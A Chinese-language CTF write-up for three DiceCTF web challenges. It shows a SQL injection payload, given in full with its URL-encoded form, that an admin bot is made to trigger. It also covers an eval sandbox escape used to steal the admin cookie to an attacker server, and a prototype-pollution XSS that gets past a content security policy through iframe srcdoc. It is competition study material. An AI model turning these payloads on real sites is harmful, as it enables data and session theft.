    // /panel/widgets 
    query = `SELECT widgetname, widgetdata FROM widgets WHERE panelid = ?`;
    // /panel/add
    query = `INSERT INTO widgets (panelid, widgetname, widgetdata) VALUES (?, ?, ?)`;
前两处路由都做了预编译，显然无法注入，于是只能考虑第三处
    app.get('/admin/debug/add_widget', async (req, res) => {
        const cookies = req.cookies;
        const queryParams = req.query;
        if(cookies['token'] && cookies['token'] == secret_token){
            query = `INSERT INTO widgets (panelid, widgetname, widgetdata) VALUES ('${queryParams['panelid']}', '${queryParams['widgetname']}', '${queryParams['widgetdata']}');`;
            db.run(query, (err) => {
                if(err){
                    console.log(err);
                    res.send('something went wrong');
                }else{
                    res.send('success!');
                }
            });
        }else{
            res.redirect('/');
        }
    });
这里只能admin才能进行访问，但这个题目同样有一个admin bot，所以我们只要构造好url让admin bot访问添加数据即可。
从源码中已知flag在flag表中，所以我们可以这么注入
    ?panelid=72a8ca36-fae5-4985-9742-b87b53e30222',(select flag from flag),'{\"type\":\"time\"}'); -- &widgetname=a&widgetdata=a
注意这里的panelid换成自己对应的panelid，通过上面的注入，相当于得到了下面的sql语句
    INSERT INTO widgets (panelid, widgetname, widgetdata) VALUES ('72a8ca36-fae5-4985-9742-b87b53e30222', (select flag from flag),'{\"type\":\"time\"}'); -- ','a','a');
最终用请求的url编码一下就是
    https://build-a-panel.dicec.tf/admin/debug/add_widget?panelid=72a8ca36-fae5-4985-9742-b87b53e30222%27,(select%20*%20from%20flag),%27{"type":"time"}%27);%20--%20&widgetname=a&widgetdata=a
用admin bot发起请求后，在自己的`/panel`路径下就可以看到flag
## Web IDE
题目给了一个js代码编辑和运行页面，首先在源码中，很容易发现
    app.post('/ide/login', (req, res) => {
      const { user, password } = req.body;
      switch (user) {
      case 'guest':
        return res.cookie('token', 'guest', {
          path: '/ide',
          sameSite: 'none',
          secure: true
        }).redirect('/ide/');
      case 'admin':
        if (password === adminPassword)
          return res.cookie('token', `dice{${process.env.FLAG}}`, {
            path: '/ide',
            sameSite: 'none',
            secure: true
          }).redirect('/ide/');
        break;
      }
      res.status(401).end();
    });
所以思路就是获取到admin的cookie
    app.use('/', (req, res, next) => {
      res.setHeader('X-Frame-Options', 'DENY');
      return next();
    });
    // sandbox the sandbox
    app.use('/sandbox.html', (req, res, next) => {
      res.setHeader('Content-Security-Policy', 'frame-src \'none\'');
      // we have to allow this for obvious reasons
      res.removeHeader('X-Frame-Options');
      return next();
    });
通过上面的代码限制，我们只能在sandbox.html这里用iframe
在`/ide`路由下查看源码，可以看到有一个`sanbox.js`，代码如下
    const safeEval = (d) => (
       function (data) {
          with (new Proxy(window, {
             get: (t, p) => {
                if (p === 'console') return { log };
                if (p === 'eval') return window.eval;
                return undefined;
             }
          })) 
          {
             eval(data);
          }
    }).call(Object.create(null), d);
可以看到有个eval，考虑再利用它进行代码执行。
首先尝试了使用`console.log([].constructor.constructor);`，发现拿到了`function Function() {
[native code] }`
继续尝试`console.log([].constructor.constructor('return eval(1+1)')());`
但是由于同源策略限制，不可能直接拿到cookie，还得走sandbox.html
解决办法就是，在服务器上构造一个没有`sandbox="allow-scripts"`这个属性限制的iframe，代码如下:
在本机服务器上写了这样一个页面，访问后在控制台成功打印了window.location属性，但是存储着flag的cookie只在`/ide`路由下可见
所以需要改一下代码执行部分，改成使用window.open打开`/ide`(此时跟sandbox.html同源)，然后把对应cookie打到vps监听端口即可。
用admin bot访问服务器对应地址即可
## Build a Better Panel
这个题是Build a Panel的升级版，diff了一下，代码只改变了一点，就是设置cookie的sameSite属性为strict
    63c63
             res.cookie('panelId', newPanelId, {maxage: 10800, httponly: true, sameSite: 'strict'});
    149c149
             res.cookie('token', secret_token, {maxage: 10800, httponly: true, sameSite: 'strict'});
设置cookie的sameSite属性为strict的后，跨站点时，任何情况下都不会发送 Cookie。除此之外，在题目描述中还说明了一个限制:
    NOTE: The admin will only visit sites that match the following regex ^https:\/\/build-a-better-panel\.dicec\.tf\/create\?[0-9a-z\-\=]+$
也就是admin这次只能访问`/create`路由了，于是只能找其他方法绕过。
首先注意到`custom.js`中的这段代码
    const mergableTypes = ['boolean', 'string', 'number', 'bigint', 'symbol', 'undefined'];
    const safeDeepMerge = (target, source) => {
        for (const key in source) {
            if(!mergableTypes.includes(typeof source[key]) && !mergableTypes.includes(typeof target[key])){
                if(key !== '__proto__'){
                    safeDeepMerge(target[key], source[key]);
                }
            }else{
                target[key] = source[key];
            }
        }
    }
循环赋值，并且检查了`__proto__`关键字，看起来应该有原型链污染，但这里过滤了`__proto__`这个关键字让我不知道怎么搞了。比赛的时候在这里思路卡死了，后来看到别人说这个[poc](https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/embedly.md)，简单来说，就是可以通过
    Object.prototype.onload = 'alert(1)'
来实现xss，在我们这个题目里，对应的就是构造
    target.constructor.prototype.onload = 'alert(1)'
于是构造
    {
        "widgetName": "constructor",
        "widgetData": "{\"prototype\":{\"onload\":\"alert()\"}}"
    }
传给`/panel/add`接口，然后再去访问`/panel`，在控制台测试一下
可以看到确实成功实现了`Object.prototype.onload = 'alert(1)'`，但是并没有弹窗，因为还存在一个CSP的限制
    Content-Security-Policy: default-src 'none'; script-src 'self' http://cdn.embedly.com/; style-src 'self' http://cdn.embedly.com/; connect-src 'self' https://www.reddit.com/comments/;
Bypass CSP用到的是iframe的`srcdoc`属性，
> srcdoc 属性是一段HTML代码，这些代码会被渲染到 iframe 中。如果浏览器不支持 srcdoc 属性，则会渲染 src 属性表示的内容。
但是还有一个问题，及时我们设置了iframe的srcdoc属性为javascript，仍然无法执行，这是因为`script-src:self`限制了我们只能执行同源脚本，
但是我们可以利用`link`标签绕过,网址的payload跟上一个一样，因为注入点没改。
所以最终步骤是
1.构造payload
    console.log(
        JSON.stringify({
            widgetName: 'constructor',
            widgetData: JSON.stringify({
                prototype: {
                    srcdoc: ``
                }
            })
        }))
    //{"widgetName":"constructor","widgetData":"{\"prototype\":{\"srcdoc\":\"\"}}"}
2.在`/panel/add`通过原型链污染，往srcdoc属性注入link的内容
3.然后再用admin bot去访问对应的地址，注意这里利用`/create?debugid=xxx`带上自己cookie中的panelId即可
4.回去`/panel`就可以看到flag了
## 参考链接
1.  
2.  
3.  
4.  
5.